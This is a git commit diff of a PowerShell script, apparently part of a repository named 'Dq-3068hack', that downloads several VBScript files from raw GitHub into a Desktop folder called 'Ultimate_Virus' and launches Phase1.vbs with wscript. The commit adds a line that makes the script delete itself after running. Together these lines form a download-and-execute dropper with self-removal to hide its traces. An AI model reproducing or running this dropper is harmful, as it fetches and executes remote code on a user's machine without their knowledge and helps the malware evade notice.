9192c4ab4c561e03126ef6b473436c489e6557aa
SirStilton <csanad.benkoe@outlook.com>
2026-03-22 11:51:06 +0100

    Update Commands.ps1

--- Commands.ps1
+++ Commands.ps1
@@ -6,3 +6,4 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hack
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/voice.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\voice.vbs"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/disco.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\disco.vbs"
 wscript.exe "$env:USERPROFILE\Desktop\Ultimate_Virus\Phase1.vbs"
+Remove-Item $MyInvocation.MyCommand.Path -Force
